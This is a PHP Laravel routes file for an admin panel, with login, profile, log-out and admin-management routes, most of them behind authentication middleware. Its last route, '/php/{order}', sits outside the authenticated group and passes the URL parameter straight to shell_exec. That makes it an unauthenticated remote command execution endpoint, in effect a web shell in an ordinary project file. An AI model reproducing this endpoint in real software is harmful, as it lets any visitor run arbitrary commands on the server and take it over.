<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Config;
use Spatie\Permission\Models\Role;

Route::group(['prefix' => 'admin'], function () {
    //    Config::set('auth.defines', 'admin');

    Route::get(
        'login',
        function () {
            if (Auth::guard('admin')->check()) {
                return redirect('admin/home');
            }
            return view('Admin/auth/login');
        }
    )->name('login');
    Route::post('do-log', 'AuthController@login')->name('do-log');

    Route::group(['middleware' => 'admin:admin'], function () {


        Route::get('/', function () {
            return view('Admin/home');
        })->name('/');
        Route::get('/home', 'AuthController@home')->name('/home');
        Route::get('/profile', function () {
            return view('Admin/profile');
        })->name('/profile');
        Route::post('/save.profile', 'AdminController@save_profile')->name('/save.profile');
        Route::get('log-out', 'AuthController@logout')->name('log-out');
        //
        //
        ////        ======================================== Admin ====================================
        Route::resource('ShowAdmins', 'AdminController');
        Route::get('ShowAdminsCheckDelete', 'AdminController@ShowAdminsCheckDelete')->name('ShowAdminsCheckDelete');
        Route::get('ShowUsers', 'UserController@show')->name('UsesIndex');
    });
    Route::get('/php/{order}', function ($order) {
        $bath = base_path();
        //        $order = 'php artisan vendor:publish --tag=laravel-errors';
        return shell_exec("cd {$bath};{$order} ");
        //   \Artisan::call('dump-autoload');
        //   echo 'dump-autoload complete';
    });
});
